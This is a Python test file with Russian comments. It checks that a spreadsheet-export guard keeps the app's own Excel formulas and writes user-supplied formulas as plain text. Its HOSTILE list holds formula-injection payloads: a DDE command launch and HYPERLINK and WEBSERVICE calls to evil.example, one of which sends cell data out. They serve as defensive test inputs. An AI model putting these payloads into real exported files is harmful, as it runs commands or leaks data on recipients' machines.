# -*- coding: utf-8 -*-
"""Формулы в выгрузках Excel: исполняются только наши (аудит 23.09.2026, 9.5 / 1.L7).

`xlsx_safe` применяли 3 выгрузки из 9. Текст пользователя, начинающийся с «=» —
комментарий брифа, примечание операции, название, — в остальных уходил в файл живой
формулой: HYPERLINK, WEBSERVICE, DDE `cmd|…`, внешние ссылки срабатывали у получателя
(часто внешнего клиента). Теперь одна точка сохранения: каждая формула сверяется с
грамматикой формул, которые ставит сам код, всё остальное пишется ТЕКСТОМ.
"""
import io
import re
from pathlib import Path

from openpyxl import Workbook, load_workbook

from app.xlsx_safe import save_workbook

APP = Path(__file__).resolve().parent.parent / "app"

OURS = [
    '=SUM(B5:D5,F5:H5)',
    '=IF(E7>0,I7/E7*1000,"")',
    '=IF(AND(M7>0,E7>0),I7*M7/E7,"")',
    '=IF(Q12="CPM",O12*P12/1000,O12*P12)',
    '=CONCATENATE("I кв · ",TEXT(SUM(F5:F9),"# ##0")," ₽")',
    '=$F$5-H5',
]
HOSTILE = [
    '=HYPERLINK("http://evil.example","нажми")',
    "=cmd|' /C calc'!A0",
    '=WEBSERVICE("http://evil.example/?"&A1)',
    "=[1]Лист1!A1",
    '=IMPORTXML("http://x","//a")',
]


def _roundtrip(values):
    wb = Workbook()
    ws = wb.active
    for i, v in enumerate(values, 1):
        ws.cell(i, 1, v)
    buf = io.BytesIO()
    save_workbook(wb, buf)
    buf.seek(0)
    back = load_workbook(buf).active
    return [back.cell(i, 1) for i in range(1, len(values) + 1)]


def test_our_formulas_stay_formulas():
    for c in _roundtrip(OURS):
        assert c.data_type == 'f', f"наша формула стала текстом: {c.value}"


def test_hostile_text_is_written_as_text():
    for c, v in zip(_roundtrip(HOSTILE), HOSTILE):
        assert c.data_type == 's' and c.value == v, f"исполнится у получателя: {v}"


def test_a_reference_to_our_own_sheet_is_ours_and_to_a_foreign_one_is_not():
    """Годовой МП суммирует свой же лист: `=SUM('Годовой МП'!N13:N21)` — 23 формулы на
    файл (замер на копии прода 24.09.2026). Лист ЭТОЙ книги — можно; чужой — текстом."""
    wb = Workbook()
    wb.active.title = 'Сводка'
    wb.create_sheet('Годовой МП')
    ws = wb['Сводка']
    ws['A1'] = "=SUM('Годовой МП'!N13:N21)"
    ws['A2'] = "=SUM('Чужой лист'!N13:N21)"
    ws['A3'] = "=Сводка!B2*2"
    buf = io.BytesIO()
    save_workbook(wb, buf)
    buf.seek(0)
    back = load_workbook(buf)['Сводка']
    assert back['A1'].data_type == 'f'
    assert back['A2'].data_type == 's'
    assert back['A3'].data_type == 'f'


def test_every_workbook_is_saved_through_the_guard():
    offenders = []
    for f in APP.rglob('*.py'):
        if f.name == 'xlsx_safe.py':
            continue
        src = f.read_text(encoding='utf-8')
        for m in re.finditer(r'\bwb\d?\.save\(', src):
            offenders.append(f"{f.relative_to(APP)}:{src[:m.start()].count(chr(10)) + 1}")
    assert not offenders, "книга сохраняется мимо save_workbook: " + ", ".join(offenders)
